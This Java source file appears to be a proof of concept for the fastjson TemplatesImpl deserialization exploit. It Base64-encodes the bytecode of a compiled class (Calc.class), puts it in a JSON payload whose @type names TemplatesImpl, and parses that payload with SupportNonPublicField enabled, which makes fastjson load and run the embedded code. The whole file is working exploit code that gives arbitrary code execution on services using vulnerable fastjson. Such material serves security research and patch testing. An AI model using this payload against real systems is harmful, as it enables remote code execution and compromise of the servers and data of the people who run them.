import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class TemplatesImplPOC {
    public static void main(String[] args) throws Exception{
        final String unserializeClassName = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        final String _name = "Suzen";
        final String _bytecodes = Base64.getEncoder().encodeToString(Files.readAllBytes(Paths.get("src/main/java/classpoc/Calc.class")));

        String payload = "{\"@type\":" + "\"" + unserializeClassName + "\"," +
                "\"_name\":" + "\"" + _name + "\"," +
                "\"_bytecodes\":" + "[\"" + _bytecodes + "\"]," +
                "\"_tfactory\":{}," +
                "\"_outputProperties\":{}}";

        Object obj = JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField);
    }
}
